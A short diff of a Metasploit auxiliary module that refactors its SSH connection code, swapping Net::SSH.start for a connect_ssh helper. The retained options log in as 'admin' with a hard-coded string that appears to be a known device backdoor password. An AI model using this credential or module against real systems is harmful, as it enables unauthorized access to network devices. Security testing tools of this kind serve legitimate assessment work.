@@ -50,17 +50,17 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run_host(ip)
-    ssh_opts = ssh_client_defaults.merge({
+    ssh_opts = {
       :port => rport,
       :auth_methods => ['password', 'keyboard-interactive'],
       :password => %q{<<< %s(un='%s') = %u},
-    })
+    }
 
     ssh_opts.merge!(verbose: :debug) if datastore['SSH_DEBUG']
 
     begin
       ssh = Timeout.timeout(datastore['SSH_TIMEOUT']) do
-        Net::SSH.start(
+        connect_ssh(
           ip,
           'admin',
           ssh_opts
